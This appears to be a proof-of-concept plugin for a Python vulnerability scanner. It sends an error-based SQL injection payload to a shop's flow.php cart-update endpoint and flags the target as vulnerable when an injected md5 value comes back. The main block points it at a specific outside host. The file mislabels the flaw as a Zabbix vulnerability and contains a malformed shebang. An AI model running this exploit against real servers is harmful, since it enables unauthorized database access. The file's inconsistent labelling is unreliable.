from ..miniCurl import Curl
from ..t  import T
# !/usr/bin/dev python
# -*- coding:utf-8 -*-

"""
reference:
http://www.beebeeto.com/pdb/poc-2015-0061/
"""



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + '/flow.php?step=update_cart'
        payload = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28"
                      "*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29"
                      "+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand"
                      "%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29"
                      "+and+1%3D1+%23%5D=1&submit=exp ")
        code, head, res, errcode, finalurl = curl.curl('-d ' + payload + url)
        if code == 200:
            if '63e1f04640e83605c1d177544a5a0488' in res:
                output(url,result,'hole')
        pass
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  zabbix  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='zabbix Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/zabbix/zabbix_6d32b84d0be89f2e893f8f611f443f1b.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == "__main__":
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/zabbix/zabbix_6d32b84d0be89f2e893f8f611f443f1b.py
#/root/github/poccreate/codesrc/exp-412.py